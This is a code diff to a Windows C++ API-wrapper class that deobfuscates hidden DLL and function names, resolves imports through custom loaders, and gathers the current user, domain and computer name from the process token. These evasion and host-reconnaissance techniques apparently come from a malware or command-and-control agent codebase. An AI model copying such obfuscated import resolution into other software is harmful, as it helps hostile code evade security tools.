@@ -196,6 +196,12 @@ WinApiCustom::WinApiCustom()
 		STRING_KERNEL32_DLL_LEN,
 		strKernel32Dll);
 
+	static CHAR strKernelbaseDll[STRING_KERNELBASE_DLL_LEN + 1] = ""; // "kernelbase.dll"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_KERNELBASE_DLL,
+		STRING_KERNELBASE_DLL_LEN,
+		strKernelbaseDll);
+
 	static CHAR strUser32Dll[STRING_USER32_DLL_LEN + 1] = ""; // "User32.dll"
 	DeobfuscateUtf8String(
 		(PCHAR)STRING_USER32_DLL,
@@ -214,11 +220,11 @@ WinApiCustom::WinApiCustom()
 		STRING_BCRYPT_DLL_LEN,
 		strBcryptDll);
 
-	static CHAR strSecur32Dll[STRING_SECUR32_DLL_LEN + 1] = ""; // "Secur32.dll"
+	static CHAR strAdvapi32Dll[STRING_ADVAPI32_DLL_LEN + 1] = ""; // "Advapi32.dll"
 	DeobfuscateUtf8String(
-		(PCHAR)STRING_SECUR32_DLL,
-		STRING_SECUR32_DLL_LEN,
-		strSecur32Dll);
+		(PCHAR)STRING_ADVAPI32_DLL,
+		STRING_ADVAPI32_DLL_LEN,
+		strAdvapi32Dll);
 
 	// Get necessary strings for functions
 	static CHAR strMessageBoxA[STRING_MESSAGEBOX_A_LEN + 1] = ""; // "MessageBoxA"
@@ -363,25 +369,19 @@ WinApiCustom::WinApiCustom()
 	DeobfuscateUtf8String(
 		(PCHAR)STRING_CREATE_EVENT_A,
 		STRING_CREATE_EVENT_A_LEN,
-		strCloseHandle);
+		strCreateEventA);
 
 	static CHAR strSetEvent[STRING_SET_EVENT_LEN + 1] = ""; // "SetEvent"
 	DeobfuscateUtf8String(
 		(PCHAR)STRING_SET_EVENT,
 		STRING_SET_EVENT_LEN,
-		strCloseHandle);
+		strSetEvent);
 
 	static CHAR strResetEvent[STRING_RESET_EVENT_LEN + 1] = ""; // "ResetEvent"
 	DeobfuscateUtf8String(
 		(PCHAR)STRING_RESET_EVENT,
 		STRING_RESET_EVENT_LEN,
-		strCloseHandle);
-
-	static CHAR strGetUserNameExA[STRING_GET_USER_NAME_EX_A_LEN + 1] = ""; // "GetUserNameExA"
-	DeobfuscateUtf8String(
-		(PCHAR)STRING_GET_USER_NAME_EX_A,
-		STRING_GET_USER_NAME_EX_A_LEN,
-		strGetUserNameExA);
+		strResetEvent);
 
 	static CHAR strGetComputerNameExA[STRING_GET_COMPUTER_NAME_EX_A_LEN + 1] = ""; // "GetComputerNameExA"
 	DeobfuscateUtf8String(
@@ -389,13 +389,32 @@ WinApiCustom::WinApiCustom()
 		STRING_GET_COMPUTER_NAME_EX_A_LEN,
 		strGetComputerNameExA);
 
+	static CHAR strOpenProcessToken[STRING_OPEN_PROCESS_TOKEN_LEN + 1] = ""; // "OpenProcessToken"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_OPEN_PROCESS_TOKEN,
+		STRING_OPEN_PROCESS_TOKEN_LEN,
+		strOpenProcessToken);
+
+	static CHAR strGetTokenInformation[STRING_GET_TOKEN_INFORMATION_LEN + 1] = ""; // "GetTokenInformation"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_GET_TOKEN_INFORMATION,
+		STRING_GET_TOKEN_INFORMATION_LEN,
+		strGetTokenInformation);
+
+	static CHAR strLookupAccountSidA[STRING_LOOKUP_ACCOUNT_SID_A_LEN + 1] = ""; // "LookupAccountSidA"
+	DeobfuscateUtf8String(
+		(PCHAR)STRING_LOOKUP_ACCOUNT_SID_A,
+		STRING_LOOKUP_ACCOUNT_SID_A_LEN,
+		strLookupAccountSidA);
+
 	// Load necessary modules
 	loadedModules.hNtdll = LoadLibraryCustom(strNtdllDll);
+	loadedModules.hKernelbase = LoadLibraryCustom(strKernelbaseDll);
 	loadedModules.hKernel32 = LoadLibraryCustom(strKernel32Dll);
 	loadedModules.hUser32 = LoadLibraryCustom(strUser32Dll);
 	loadedModules.hWininet = LoadLibraryCustom(strWininetDll);
 	loadedModules.hBcrypt = LoadLibraryCustom(strBcryptDll);
-	loadedModules.hSecur32 = LoadLibraryCustom(strSecur32Dll);
+	loadedModules.hAdvapi32 = LoadLibraryCustom(strAdvapi32Dll);
 
 	// Save necessary global module handles
 	hNtdll = loadedModules.hNtdll;
@@ -427,8 +446,10 @@ WinApiCustom::WinApiCustom()
 	loadedFunctions.CreateEventA = (HANDLE(*)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName))GetProcAddressCustom(loadedModules.hKernel32, strCreateEventA);
 	loadedFunctions.SetEvent = (BOOL(*)(HANDLE hEvent))GetProcAddressCustom(loadedModules.hKernel32, strSetEvent);
 	loadedFunctions.ResetEvent = (BOOL(*)(HANDLE hEvent))GetProcAddressCustom(loadedModules.hKernel32, strResetEvent);
-	loadedFunctions.GetUserNameExA = (BOOLEAN(*)(IN EXTENDED_NAME_FORMAT NameFormat, OUT LPSTR lpNameBuffer, IN OUT PULONG nSize))GetProcAddressCustom(loadedModules.hSecur32, strGetUserNameExA);
 	loadedFunctions.GetComputerNameExA = (BOOL(*)(IN COMPUTER_NAME_FORMAT NameType, OUT LPSTR lpBuffer, IN OUT LPDWORD nSize))GetProcAddressCustom(loadedModules.hKernel32, strGetComputerNameExA);
+	loadedFunctions.OpenProcessToken = (BOOL(*)(IN HANDLE ProcessHandle, IN DWORD DesiredAccess, OUT PHANDLE TokenHandle))GetProcAddressCustom(loadedModules.hAdvapi32, strOpenProcessToken);
+	loadedFunctions.GetTokenInformation = (BOOL(*)(IN HANDLE TokenHandle, IN TOKEN_INFORMATION_CLASS TokenInformationClass, OUT LPVOID TokenInformation, IN DWORD TokenInformationLength, OUT PDWORD ReturnLength))GetProcAddressCustom(loadedModules.hAdvapi32, strGetTokenInformation);
+	loadedFunctions.LookupAccountSidA = (BOOL(*)(IN LPCSTR lpSystemName, IN PSID Sid, OUT LPSTR Name, IN LPDWORD cchName, OUT LPSTR ReferencedDomainName, IN OUT LPDWORD cchReferencedDomainName, OUT PSID_NAME_USE peUse))GetProcAddressCustom(loadedModules.hAdvapi32, strLookupAccountSidA);
 }
 
 /* Destructor for WinApiCustom */
@@ -436,7 +457,7 @@ WinApiCustom::~WinApiCustom()
 {
 	// Free library (modules)
 	// FreeLibraryCustom(loadedModules.hKernel32); TODO
-	FreeLibraryCustom(loadedModules.hUser32);
+	// FreeLibraryCustom(loadedModules.hUser32);
 }
 
 /* WRAPPER FUNCTIONS FOR WinApiCustom */
@@ -487,38 +508,91 @@ HANDLE WinApiCustom::CreateMutexCustom()
 	return this->loadedFunctions.CreateMutexA(NULL, FALSE, NULL);
 }
 
+/* Get current process handle */
+HANDLE WinApiCustom::GetCurrentProcessHandle()
+{
+	return (HANDLE)-1;
+}
+
 /*
 Get user name wrapper
 
-Returned pointer points to buffer that must be manually freed
+Returned double-pointers point to buffers that must be manually freed
 */
-LPVOID WinApiCustom::GetUserNameCustom()
+void WinApiCustom::GetUserNameCustom(OUT LPVOID *ppUserName, OUT LPVOID *ppDomainName)
 {
-	ULONG size = 0;
-	this->loadedFunctions.GetUserNameExA(
-		EXTENDED_NAME_FORMAT::NameSamCompatible,
+	// Initialise data
+	HANDLE hCurrentProcessToken = NULL;
+
+	// Get handle to current process's token
+	this->loadedFunctions.OpenProcessToken(
+		this->GetCurrentProcessHandle(),
+		TOKEN_QUERY,
+		&hCurrentProcessToken);
+	if (hCurrentProcessToken == NULL)
+		goto CLEANUP;
+
+	// Get token's user's SID
+	DWORD tokenUserSize = 0;
+	this->loadedFunctions.GetTokenInformation(
+		hCurrentProcessToken,
+		TokenUser,
 		NULL,
-		&size);
+		0,
+		&tokenUserSize);
+	if (tokenUserSize == NULL)
+		goto CLEANUP;
 
-	if (size == 0)
-		return NULL;
+	PTOKEN_USER pTokenUser = (PTOKEN_USER)(this->HeapAllocCustom(tokenUserSize));
+	if (pTokenUser == NULL)
+		goto CLEANUP;
 
-	size = size / sizeof(WCHAR);
+	this->loadedFunctions.GetTokenInformation(
+		hCurrentProcessToken,
+		TokenUser,
+		pTokenUser,
+		tokenUserSize,
+		&tokenUserSize);
 
-	LPVOID userNameBuf = this->HeapAllocCustom(size);
-	if (userNameBuf == NULL)
-		return NULL;
+	PSID pTokenUserSid = pTokenUser->User.Sid;
+	if (pTokenUserSid == NULL)
+		goto CLEANUP;
 
-	if (!this->loadedFunctions.GetUserNameExA(
-			EXTENDED_NAME_FORMAT::NameSamCompatible,
-			(LPSTR)userNameBuf,
-			&size))
-	{
-		this->HeapFreeCustom(userNameBuf);
-		return NULL;
-	}
+	// Lookup user with above found SID
+	DWORD userNameSize = 0;
+	DWORD domainNameSize = 0;
+	SID_NAME_USE sidNameUse;
+	this->loadedFunctions.LookupAccountSidA(
+		NULL,
+		pTokenUserSid,
+		NULL,
+		&userNameSize,
+		NULL,
+		&domainNameSize,
+		&sidNameUse);
+	if (userNameSize == 0 || domainNameSize == 0)
+		goto CLEANUP;
 
-	return userNameBuf;
+	*ppUserName = this->HeapAllocCustom(userNameSize);
+	*ppDomainName = this->HeapAllocCustom(domainNameSize);
+	if (*ppUserName == NULL || *ppDomainName == NULL)
+		goto CLEANUP;
+
+	this->loadedFunctions.LookupAccountSidA(
+		NULL,
+		pTokenUserSid,
+		(LPSTR)*ppUserName,
+		&userNameSize,
+		(LPSTR)*ppDomainName,
+		&domainNameSize,
+		&sidNameUse);
+
+CLEANUP:
+	if (hCurrentProcessToken != NULL)
+		this->loadedFunctions.CloseHandle(hCurrentProcessToken);
+
+	if (pTokenUser)
+		this->HeapFreeCustom(pTokenUser);
 }
 
 /*
